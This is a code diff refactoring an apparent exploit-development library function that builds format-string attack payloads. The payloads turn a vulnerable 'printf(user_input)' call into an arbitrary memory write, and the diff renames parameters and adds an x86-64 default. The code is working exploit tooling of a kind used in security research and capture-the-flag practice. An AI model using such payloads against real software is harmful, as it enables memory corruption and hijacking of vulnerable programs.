@@ -1,6 +1,6 @@
 # offsec.fmt: build a format-string exploit payload for an arbitrary write.
 #
-#     const p: vector[u8] = fmt.write(0x404040, 0xdeadbeef, 6, Width.Bits64)
+#     const p: vector[u8] = fmt.write(0x404040, 0xdeadbeef, 6)   # x86-64; `width=Width.Bits32`
 #
 # When a program calls `printf(user_input)` on your bytes, `%n`-family specifiers write the
 # number of characters printed so far to an address taken from the stack. `write` turns that into
@@ -37,25 +37,25 @@ priv manual fn build_spec(bytes: &vector[i64], offset: size, slots: size, width:
     return s
 
 # A payload that makes `printf` write `value` to `target`. `offset` is the argument index where
-# the payload starts on the stack; `bits` is the target's class.
-manual fn write(target: u64, value: u64, offset: size, bits: Width) -> vector[u8]:
+# the payload starts on the stack; `width` is the target's class, x86-64 by default.
+manual fn write(target: u64, value: u64, offset: size, width: Width = Width.Bits64) -> vector[u8]:
     mut slot: size = 8
-    if bits == Width.Bits32:
+    if width == Width.Bits32:
         slot = 4
-    const width: size = slot
+    const count: size = slot
     mut bytes: vector[i64] = []
     mut addrs: vector[u64] = []
     mut i: size = 0
-    while i < width:
+    while i < count:
         bytes.push(i64((value >> u64(8 * i)) & u64(255)))
         addrs.push(target + u64(i))
         i += 1
     # sort (byte, address) pairs by byte value ascending
     mut a: size = 0
-    while a < width:
+    while a < count:
         mut m: size = a
         mut b: size = a + 1
-        while b < width:
+        while b < count:
             if bytes[b] < bytes[m]:
                 m = b
             b += 1
@@ -72,7 +72,7 @@ manual fn write(target: u64, value: u64, offset: size, bits: Width) -> vector[u8
     mut spec: str = ""
     mut tries: size = 0
     while tries < 8:
-        spec = build_spec(&bytes, offset, slots, width)
+        spec = build_spec(&bytes, offset, slots, count)
         const got: size = align_up(byte_len(spec), slot) // slot
         if got == slots:
             tries = 8
@@ -88,7 +88,7 @@ manual fn write(target: u64, value: u64, offset: size, bits: Width) -> vector[u8
     while len(out) % slot != 0:
         out.push(u8(0x41))
     mut j: size = 0
-    while j < width:
+    while j < count:
         mut w: size = 0
         while w < slot:
             out.push(u8((addrs[j] >> u64(8 * w)) & u64(255)))
